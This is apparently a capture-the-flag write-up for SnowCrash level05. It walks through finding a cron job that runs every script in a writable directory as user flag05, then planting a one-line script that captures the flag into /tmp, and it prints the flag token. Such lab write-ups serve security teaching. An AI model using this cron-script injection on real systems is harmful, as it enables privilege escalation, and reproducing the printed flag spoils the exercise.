# level05

```jsx
level05@SnowCrash:~$ find / -name level05 2>/dev/null
/var/mail/level05
/rofs/var/mail/level05

level05@SnowCrash:/var/mail$ cat level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

- */2 * * * *: script that executes every 2 minutes
- su: allows opening another session in the background that has access to the same file ecosystem as the session I am logged into
- -c: allows specifying the command to execute
- "sh /usr/sbin/openarenaserver": command used to execute a bash script named openarenaserver
- -: equivalent to --login, which specifies the login of the session su should connect to
- flag05: login of the session in question
→ the command that launches the openarenaserver script will therefore execute with flag05 permissions

```jsx
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

- for i in /opt/openarenaserver/* : the bash script iterates through all files located in /opt/openarenaserver
- do (ulimit -t 5; bash -x "$i") :
    - bash -x "$i" : executes each script found in the directory using the Bash Shell interpreter
    - ulimit -t 5 : sets a 5-second CPU time limit for the execution of each launched script (prevents infinite loops)
    - the parentheses indicate that each script is executed in a new subshell/process
- rm -f "$i” : removes the file

```jsx
level05@SnowCrash:/usr/sbin$ ls -la | grep openarenaserver
-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
```

Only flag05 has the right to execute the openarenaserver script.

```jsx
level05@SnowCrash:/opt/openarenaserver$ ls -la
total 0
drwxrwxr-x+ 2 root root 40 Sep  5 11:52 .
```

The directory specified in the openarenaserver script has write permissions.

If every two minutes, the openarenaserver script is launched with flag05 permissions, thereby executing all scripts present in the /opt/openarenaserver/ directory, we simply need to create a script in this directory that calls getflag and redirects its output to a flag.txt file.

```jsx
level05@SnowCrash:/opt/openarenaserver$ 
level05@SnowCrash:/opt/openarenaserver$ echo "getflag > /tmp/flag.txt" > flag.sh
```

We redirect the output of getflag to a flag.txt file inside the tmp directory because we have write permissions there, and because if we didn't, the output of getflag (which is executed in another process) would not be displayed in the terminal.

```jsx
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

We display the contents of the file where the output of getflag was redirected.

flag : viuaaale9huek52boumoomioc